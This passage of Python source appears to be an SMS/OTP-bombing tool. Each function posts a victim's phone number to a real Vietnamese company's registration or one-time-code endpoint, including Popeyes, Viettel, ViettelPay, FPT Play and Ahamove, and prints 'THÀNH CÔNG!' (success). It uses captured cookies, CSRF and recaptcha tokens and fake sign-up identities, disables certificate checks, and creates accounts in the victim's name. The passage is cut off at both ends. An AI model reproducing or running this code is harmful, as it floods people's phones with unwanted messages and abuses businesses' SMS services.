        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-client': 'WebApp',
    }

    json_data = {
        'phone': phone,
        'firstName': 'tuoi',
        'lastName': 'la',
        'email': 'latuoi@gmail.com',
        'password': 'cocailon',
    }

    response = requests.post('https://api.popeyes.vn/api/v1/register', cookies=cookies, headers=headers, json=json_data)
    print(format_print("*", "sms19: THÀNH CÔNG!"))
    
    
#sms 43
def sms20(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN',
        'BrandCode': 'ALFRESCOS',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'DNT': '1',
        'DeviceCode': 'web',
        'Origin': 'https://alfrescos.com.vn',
        'Referer': 'https://alfrescos.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'culture': 'vi-VN',
    }

    json_data = {
        'phoneNumber': phone,
        'secureHash': '753d977024f8d805306e5078ad25a00a',
        'deviceId': '',
        'sendTime': 1703860383205,
        'type': 1,
    }

    response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, json=json_data)
    print(format_print("*", "sms20: THÀNH CÔNG!"))
    

#sms 44
def sms21(phone):
    requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]})).text
    print(format_print("*", "sms21: THÀNH CÔNG!"))
    
    
#sms 48
def sms22(phone):
    headers = {
        'authority': 'api.fptplay.net',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://fptplay.vn',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-did': 'ABF6AD8B2ACE7D0E',
    }

    json_data = {
        'phone': phone,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    response = requests.post(
        'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=CUZ-KiJXaLMJ7FszwK_Zrw&e=1703864126&device=Chrome(version%253A120.0.0.0)&drm=1',
        headers=headers,
        json=json_data,
    )
    print(format_print("*", "sms22: THÀNH CÔNG!"))
    
    
#sms49
def sms23(phone):
    headers = {
        'authority': 'api.ahamove.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://app.ahamove.com',
        'referer': 'https://app.ahamove.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    json_data = {
        'mobile': phone[1:9],
        'name': 'hoang',
        'email': 'bohoangdz@gmail.com',
        'country_code': 'VN',
        'firebase_sms_auth': 'true',
        'time': 1703860692,
        'checksum': 'H5orYHI463TcARZHf6xyU/lyv4+lx3w68FS1zNXx0Cx9gaj2npSXuh2aKSCVfR44cTSPPumj1ECww4Rlvn7hcEYP4RtrY8JZicv4ZPpWnxxyvS3NOuyPxOo64PatsAf8+dnEn09D0llQoq8FlD6tQfZ06bn9b5Ug1ZRakqndxdA4D4Y03bcXeraizM7P5EHkNzMebCIjOxANDSh8ODEqLBhmgKrkKSZT2Nl3ObWPQuhY0dO5xp7zW4zaBNbkD+JlvyewhsD9mN4pPxoambo2LfpXwDQthi04i/UKqEy+QtoM0bVkYypsUA1QiFvt+tKSSPf2C1qCJv5xJqUYehjiUg==',
    }

    response = requests.post('https://api.ahamove.com/api/v3/public/user/register', headers=headers, json=json_data)
    print(format_print("*", "sms23: THÀNH CÔNG!"))
    
    
#sms 52
def sms24(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
    print(format_print("*", "sms24: THÀNH CÔNG!"))
    
    
#sms 55
def sms25(phone):
    headers = {
        'authority': 'www.kidsplaza.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json',
        'cookie': 'PHPSESSID=kinglbn5spravi3luvaatgs3jp; __Secure-API_SESSION=kinglbn5spravi3luvaatgs3jp; cdp_customerIdentify=1; _gcl_au=1.1.687785078.1703860922; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; _gcl_aw=GCL.1703860929.CjwKCAiA-bmsBhAGEiwAoaQNmgcF7QjCtXC0oVUR6tR1trfoIm6IB2LRFOvYfhoUbSdCSUBBKJlssRoC6sEQAvD_BwE; _atm_objs=eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6ImFzc29jaWF0ZV91dG0i%0D%0ALCJjaGVja3N1bSI6IioiLCJ0aW1lIjoxNzAzODYwOTI5NzQzfQ%3D%3D; _pk_ref.564990546.fc16=%5B%22%22%2C%22%22%2C1703860930%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.564990546.fc16=*; form_key=HjN8YsX4Mj1p9W9E; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; form_key=HjN8YsX4Mj1p9W9E; _fbp=fb.1.1703860934946.540016440; _ga=GA1.1.1236270977.1703860935; _cdp_cfg=1; _cdp_fsid=3752649465283696; _asm_visitor_type=n; _ac_au_gt=1703860933843; _tt_enable_cookie=1; _ttp=IifvYCxKQHopLZQZnGf5XzcMpUz; _asm_uid=1380356661; store=hcm; private_content_version=updated-658edad32e5e12.60064562; X-Magento-Vary=e46423ae947909f49073dd3d5e74aa7e8975e2be; _asm_ss_view=%7B%22time%22%3A1703860935474%2C%22sid%22%3A%223752649465283696%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222023-12-29T14%3A42%3A46%22%2C%22duration%22%3A30994%7D; _ga_T93VCQ3ZQS=GS1.1.1703860935.1.1.1703860967.28.0.0; _pk_id.564990546.fc16=1380356661.1703860930.1.1703860983.1703860930.; _ac_client_id=1380356661.1703860983; _ac_an_session=zgzkzmzhzlznzqznzlzmzhzrzgzlzqzlzdzizgzrzjzgzmzlzlzlzizdzizkzjzgzrzlzjzqzrzgzdzizdzizkzjzgzrzlzjzqzrzgzdzizkzjzgzrzlzjzqzrzgzdzizdzhzlzdzhzd2f27zdzgzdzlzmzlzkzjzd; au_id=1380356661; section_data_ids=%7B%22customer%22%3A1703861934%2C%22cart%22%3A1703861970%2C%22shipping_address_selected%22%3A1703861972%2C%22messages%22%3Anull%2C%22compare-products%22%3Anull%2C%22last-ordered-items%22%3Anull%2C%22directory-data%22%3Anull%2C%22captcha%22%3Anull%2C%22instant-purchase%22%3Anull%2C%22persistent%22%3Anull%2C%22review%22%3Anull%2C%22wishlist%22%3Anull%2C%22faq%22%3Anull%2C%22ammessages%22%3Anull%2C%22rewards%22%3Anull%2C%22ins%22%3Anull%2C%22custom_address_local_storage_data%22%3Anull%2C%22recently_viewed_product%22%3Anull%2C%22recently_compared_product%22%3Anull%2C%22product_data_storage%22%3Anull%2C%22paypal-billing-agreement%22%3Anull%7D',
        'dnt': '1',
        'origin': 'https://www.kidsplaza.vn',
        'referer': 'https://www.kidsplaza.vn/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'data': {
            'password': 'Qưert1234',
            'confirm_password': 'Qưert1234',
            'phone': phone,
            'email': 'caobaquat@gmail.com',
            'name': 'cao qua quat',
            'website_id': '2',
            'g_recaptcha_response': '03AFcWeA75cAjgxMNMOL5LbmcYAhxTdK2QLb3HgQ96S8MbpbVFLlCj5-U4AGBKZBg3PEyDyCw1gp1wmsGpeiEVKZ3wmLAkySQAhE_v-on0nHF1-ypoucOAVp9QS8X7J9EFxUuo2bQ1Iysa7OgVxzQ9jRz4JZ3SLHtjmjjl0UoYYrBFBamdaUvCZrRNw9HjuIyPQJrxXuCsL4Bw0FpqSaRAHrsF4aP4mMV7azfBII4n6foFEjbV5v9hyYtRkwj_vvwIBV2PpI9rtcI1zy2e0cnlONPVCO3pSIdBpnU6b1Q45RiCU8PZ5YHxQNzYQDNhdOW8SDKBV7PBjB_rk4puJ-EjuAa8xih2TfGpXkIxPV_B4MXshMiUYOGK6kAW1jtC06Ai49Sv2xAbyl_sJZ9kyPYCLmPUigyUhZfDTk6wzf1FTxbi9IwZ5Y69zkkIdI3E6cGK-QYPKl8NY9EQhgtKRSp-VcdGLIpanU1EmTeeuXn_q1EK-fxvN4rTJtGgwo4--UP2_kA2lk3Cygn3uFIZNnB_7YtlaeMvA-QQWJdjXM7R9frcK3KdxbIhkCKxw8xCMSYbc9wbIw-6vbUuUVoMM7vQNkmRb-Klu5tewPi9uOItwDiYmXQLBjW7ucTjvv63sZ_ZPYtAVmOc4iNMvJ3mi2k1XO7zYmZp7pNm2b47vzUIh-fmpOjDarghErGglilfy1U5grW_HV1scyhp5lWrSLhyQ9a_n3cxBCkqoRCeFv3rdco7KotOV1u1BfON_xHLeAGrbgpOybT62N0hjcFS8RElTEf8pddtQ-jz0EqfuP5N1kOi-6g4lY9bggZJ09bbJkdGXb1VmVLrlOAOTCgqW_0cAA7HqOXjpM3Nqtp9sp8IifvCpp_1nKHaACNyJca4Nla-ftROHVnHxLxq656pZws_7tEBBZzhkCuC_8x7Q_tJ_vfNLPDY13TY-Ep-jd9YM-hYxU-RnBidA8BJ4FvJjEVBLH9i7TKKO-quVZWIVRSY8o5xbymism17BCtpfZztjfC8q2_S2D5_EPWgkojMlfBkeeg3rlTnioP4NeGA1DE9cV-GP9_vpDcVGz1dg7wMbSKt59vw4yKnJX75fypBTAVgVrVyrvWRYF9fNBalVWQ6wu7ie_XpaCiOXVAys6UPl6lYsiJadvDJerYmRF58IJKSASUnunNZxN5zg-NGZvfu_ozzvRhrdlcvhc3Lm5xfN-uVT-GQfC0lg7yc30IOAMMVvjEGKA-XcJaGxq3Uw4ITikUSQRmr1u_PgoTV6qdxnYFaB9xV_sGMVT6z8P2SrSaUM4VWOL-SBZCbk7Mf2HOZYjxhglDwDJBt2DV2dgYNR-ApXpsNCjZwqnAzDGGH56XIX6Y7kk75C-C9aIHdErlX1ee3t6Pif8ZRcitngOrXMz_duyNPFKLVY78ZmBslhJJXJ_ywhh-P4tqxrDDlhYK1m_bwMwo4iWTYK2J92yTaX6c0cxg-TBYE0eAYZiscCvmxBf7egqpp6dMnFiS7f9JqFa8_lrG6gaFlaSrU9Q5hR77GbD9LO6eRLM68k1EE4APjUs9faxlhQ4z1rmB9b66HMab9Ug_dllDWSM9TUKTQOuJj4qoLmmD2bZAJ',
        },
    }

    response = requests.post(
        'https://www.kidsplaza.vn/rest/hcm/V1/customer/account/register/on-web',
        headers=headers,
        json=json_data,
    )
    print(format_print("*", "sms25: THÀNH CÔNG!"))
    
    
#sms 56
def sms26(phone):
    cookies = {
        '_ga': 'GA1.1.1751329135.1703861100',
        '_fbp': 'fb.1.1703861102777.176529727',
        '_ga_5KHZV6MD4J': 'GS1.1.1703861100.1.0.1703861109.0.0.0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        # 'Cookie': '_ga=GA1.1.1751329135.1703861100; _fbp=fb.1.1703861102777.176529727; _ga_5KHZV6MD4J=GS1.1.1703861100.1.0.1703861109.0.0.0',
        'DNT': '1',
        'Origin': 'https://id.icankid.vn',
        'Referer': 'https://id.icankid.vn/auth',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'content-type': 'application/json',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'challenge_code': '5b9005fe63325e396605b903a880358e7918d9f62c42dfb5c707116318164dfd',
        'challenge_method': 'SHA256',
        'recaptcha_response': '03AFcWeA4KZqSQejuSnmkm5NLHnv2jrAlew4hLmnOMiDH7mZ20TfbdLgvb_iFXbQm9i8qccALnN2RayQRVgWM_EJlfStQ4-r6SEBkVOkBHRMiJjNJsa4ghuX8I48UKvE9r1BiEJ3_BBgRuBKN_s-X7vFt231Gis2cK9lbjOzt0x2MHWcEAfP6ixjN3-5fPL9ogloWRillgHqIgRk2F761fzfwgOH0ymjm0umHxZaRULHoegWjdoB3vXllk1DYhYo-y4xSxn7tq_e9OwVC2xIGjLtO5vR94BioeIrsr368CkZItqFTFmGKqcI12Dkr558aeR1CWoCt6ihiDDR8eoN1o68A4TOFA_TVu0VrCmmME-MrE1QI5ItocnoJaxcO5RKFFsIu1QYqtpX-N3cHQuP6P9phnMNmyVY8H5H_xSiTnceAA0CUlsAn9eubQHIlUPY_ok_IXLmAZ-iFOVMVv3AvRErpnHHAoLsdLyGRhysIk7ZNtpMh57e5tlTHezJr7CPpO7rchUDdM2mEnBD-bJPyMNtNyxe3LieCMvG32okTXvGjLbA6wcLiCIzwT6c5RtHFMqvq_FYfSTvOiKQITguDNWw3xR9SQT2RcJwbZh4JehwoYmakYj190l8EJ-_PiiknxDi2LhSp1FhRCObX0js7Sl-vfaHVrXRgPOF38gc_RRRfLBnT8g7jszvM8DdKfwY10l5lxaBW18j1hSWwpnZDDRlyKhn_TOqusm2e-XQbE-a1V26Ft3_QJfzL4Y9Eo2PQgrW7LKuPYCot9lWiX6QexWV5GNL4rNWt6mXQMJFCgoAlfmyrQey5tbv44eeFZOzWOZWy2OLedVy5bLwMh5TqOFowZ3yTPIt0NWVb005ElpX5NGKyLjSRKUlXSiuNTWSW6bNYPyZr3FcVpA5ONSrc0F4Ctl7HydtGF2KmULQVI8UWp73IqVL8E5HJGuKToPzRkZjNRXlvRerXacSb2bLiXioMR6KG6rtNpoRbgPu1GjH8v79BRXNFb9SZu1ADx0Sy-u00_CjeYuRj5gp32PprtOcj8BuMKaHdd9K2cAh9aXOvleES73qk3UlOodXrJa6apbj6PFpUtYE5qE3NaAENYz1rp6-NQ89FHR7KJ3OSnLZqcASGp7ba0gt-nsNXyr7qR-Dieg2alljtOzSYfF0F3_c2UMSnMjWTu65pKyPzLmBDr0KFIGvbrqd_kcdfpDdQIL2-4uCkZ_9DDomACMTIYtq9kCVh_XWW8iPEkMuwCDHACBFA7VO5SPMYYb7uMoqj90lQ0fTFI364lvYzvHXKlaU97Zng-XOJRS-dGlSyu0ceDi5iZqd1BiivlIConTRvFPvDEVvEDK2IILpeS8zx9LFInmTainw8CmU65quBQkM7bir8UG7hvL4-Aa940kxuiTB1SbAkVl_4y0LPoMZ_DHMGNp9CS_jDNr5IatcFICb-g67g_U2J1uJC44SigbOjuMIQSMqZjTk1iIa4vzCKThBeb-3ncif1We_ASXy8xuTQUc_w_zpp-bzL2F-jYi86omdge49GNQbr28gM6Sq57sSjjH6GJ0YyVVygaWO8mi9gkhyYmriG_xZiHJRK3Eco-Z3SBNHewpWCp',
    }

    response = requests.post('https://id.icankid.vn/api/otp/challenge/', cookies=cookies, headers=headers, json=json_data)
    print(format_print("*", "sms26: THÀNH CÔNG!"))
    
    
#sms 58
def sms27(phone):
    cookies = {
        '_ym_uid': '1693617049750570465',
        '_ym_d': '1693617049',
        '_hjSessionUser_1750246': 'eyJpZCI6IjVhOGE0OGI2LTM5YTktNTY5ZC1hNTJmLTlhMjc0ZDFmMjE4MiIsImNyZWF0ZWQiOjE2OTM2MTcwNTA1OTYsImV4aXN0aW5nIjpmYWxzZX0=',
        'tts-utm-source': 'googlese',
        'tts_analytics_guest_id': 'v6xJVO1mOf6mRnBcj9dMa',
        'XSRF-TOKEN': 'ogjtKPLiRqRYXapEbaRp479KQzXMMNTGEDVcaBG1',
        'laravel_session': 'NPhgjHtQLS9zTjkcXagKiBHeH1NggSzio48tN1mz',
        '_gcl_au': '1.1.869912624.1703861253',
        '_ga': 'GA1.1.1625249642.1703861258',
        'NPS_81d9bd77_last_seen': '1703861258680',
        '_hjSessionUser_1638305': 'eyJpZCI6IjM1YzcxMzNiLTRkM2EtNWQ3MC1hMTVhLThlODA5NTFmOTQ0YSIsImNyZWF0ZWQiOjE3MDM4NjEyNjI1NzAsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_1638305': '0',
        '_hjSession_1638305': 'eyJpZCI6ImQ1ZWZhMjk5LTI2ZjMtNGU2My04MTJlLTRiNWI0Mzc4NmE0YyIsImMiOjE3MDM4NjEyNjI1ODQsInMiOjAsInIiOjAsInNiIjowfQ==',
        '_fbp': 'fb.1.1703861263674.583644751',
        '_ga_W85LP5ZTQK': 'GS1.1.1703861258.1.1.1703861266.52.0.0',
        '_ym_isad': '1',
        '_ym_visorc': 'w',
        'tts_notify_request': 'true',
    }

    headers = {
        'authority': 'thitruongsi.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json',
        # 'cookie': '_ym_uid=1693617049750570465; _ym_d=1693617049; _hjSessionUser_1750246=eyJpZCI6IjVhOGE0OGI2LTM5YTktNTY5ZC1hNTJmLTlhMjc0ZDFmMjE4MiIsImNyZWF0ZWQiOjE2OTM2MTcwNTA1OTYsImV4aXN0aW5nIjpmYWxzZX0=; tts-utm-source=googlese; tts_analytics_guest_id=v6xJVO1mOf6mRnBcj9dMa; XSRF-TOKEN=ogjtKPLiRqRYXapEbaRp479KQzXMMNTGEDVcaBG1; laravel_session=NPhgjHtQLS9zTjkcXagKiBHeH1NggSzio48tN1mz; _gcl_au=1.1.869912624.1703861253; _ga=GA1.1.1625249642.1703861258; NPS_81d9bd77_last_seen=1703861258680; _hjSessionUser_1638305=eyJpZCI6IjM1YzcxMzNiLTRkM2EtNWQ3MC1hMTVhLThlODA5NTFmOTQ0YSIsImNyZWF0ZWQiOjE3MDM4NjEyNjI1NzAsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_1638305=0; _hjSession_1638305=eyJpZCI6ImQ1ZWZhMjk5LTI2ZjMtNGU2My04MTJlLTRiNWI0Mzc4NmE0YyIsImMiOjE3MDM4NjEyNjI1ODQsInMiOjAsInIiOjAsInNiIjowfQ==; _fbp=fb.1.1703861263674.583644751; _ga_W85LP5ZTQK=GS1.1.1703861258.1.1.1703861266.52.0.0; _ym_isad=1; _ym_visorc=w; tts_notify_request=true',
        'dnt': '1',
        'origin': 'https://thitruongsi.com',
        'referer': 'https://thitruongsi.com/user/register',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        'x-xsrf-token': 'ogjtKPLiRqRYXapEbaRp479KQzXMMNTGEDVcaBG1',
    }

    json_data = {
        'account_phone': phone,
        'recaptcha_token': '03AFcWeA7v381xRFe3ivbZ6DLZhSCCy-7BXHn8peQLvLsMjhj0gqDLgsPXXn7aMZmjv60dFtXtKwev15IXaOG3Y_ZjsvojTeWHjmgFGw5GfvbMyXCAwTWQCYNLd3kbHpFMr4EyPb-97Nz4C4UF3tBfGm-W32Qq7AnTZdxKiy-W_hQ559telE03X6dcy6TKa7ucbDiXMzir5coCZewqj8pgzNP_4nwex-4WPfVTN_FPiX_ri89IJXis30eau37mXEdm-dcz3tS_lkCz5OZaDthG_zTDzxQhw4QhGGrMdawvC_A9Y8ltN1XoU1YsDjl864Jo2cuQ6JnVJ2GS4jkE17dkrPqBOlI1xYUu3CTv7eUypbccX3685-mAN_GYtZv5Loja3Yv1B7Pec8c6yasF2DiL_SoKB24tD6eTzfo2sWI4euVy2lJiWHlSO0H6K1MOSFMuyISzJevJqTKD_1Rsq351gU76F9mOJ6SVuF0HCRZddIlYgfCsZyOgGL88MZZZjNlArXN871ALM6eBsUwnPcxraflCmlZJ2wEa66EjRuAVH1HUp9EOtW4R4B-xQMFXAOEhLOlG1fpR8b6kF21UbzE00iwWhROOE8XUXA',
    }

    response = requests.post(
        'https://thitruongsi.com/endpoint/v1/user/api/v4/users/register/step1-phone',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    print(format_print("*", "sms27: THÀNH CÔNG!"))
    
    
#sms 59
def sms28(phone):
    link = 'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=' + phone
    response = requests.post(link)
    print(format_print("*", "sms28: THÀNH CÔNG!"))
    
    
#sms 61
def sms61(phone):
    headers = {
        "Host": "api8.viettelpay.vn",
        "product": "VIETTELPAY",
        "accept-language": "vi",
        "authority-party": "APP",
        "channel": "APP",
        "type-os": "android",
        "app-version": "5.1.4",
        "os-version": "10",
        "imei": "VTP_" + generate_random_string(32),
        "x-request-id": "20230803164512",  # Replace with the current date and time in the format "YmdHis"
        "content-type": "application/json; charset=UTF-8",
        "user-agent": "okhttp/4.2.2"
    }

    data = {
        "type": "msisdn",
        "username": phone
    }
    response = requests.post("https://api8.viettelpay.vn/customer/v1/validate/account", json=data, headers=headers, verify=False)
    get_data = response.json()

    if get_data["status"]["code"] == "CS9901":
        data = {
            "hash": "",
            "identityType": "msisdn",
            "identityValue": phone,
            "imei": "VTP_" + generate_random_string(32),
            "notifyToken": "",
            "otp": "android",
            "pin": "VTP_" + generate_random_string(32),
            "transactionId": "",
            "type": "REGISTER",
            "typeOs": "android",
            "verifyMethod": "sms"
        }
        response = requests.post("https://api8.viettelpay.vn/customer/v2/accounts/register", json=data, headers=headers, verify=False)
        get_data = response.json()
    else:
        data = {
            "imei": "VTP_" + generate_random_string(32),
            "loginType": "BASIC",
            "msisdn": phone,
            "otp": "",
            "pin": "VTP_" + generate_random_string(32),
            "requestId": "",
            "typeOs": "android",
            "userType": "msisdn",
            "username": phone
        }
        response = requests.post("https://api8.viettelpay.vn/auth/v1/authn/login", json=data, headers=headers, verify=False)
        get_data = response.json()

    if "Cần xác thực bổ sung OTP" in get_data["status"]["message"] or "Vui lòng nhập mã OTP được gửi về SĐT " + phone + " để xác minh chính chủ" in get_data["status"]["message"]:
        print(format_print("*", "sms61: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms61: THẤT BẠI!"))   
        
        
def sms29(phone):
    headers = {
        'authority': 'online-gateway.ghn.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'access-control-request-headers': 'content-type',
        'access-control-request-method': 'POST',
        'origin': 'https://sso.ghn.vn',
        'referer': 'https://sso.ghn.vn/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    response = requests.options('https://online-gateway.ghn.vn/sso/public-api/v2/client/checkexistphone', headers=headers)


    headers = {
        'authority': 'online-gateway.ghn.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://sso.ghn.vn',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
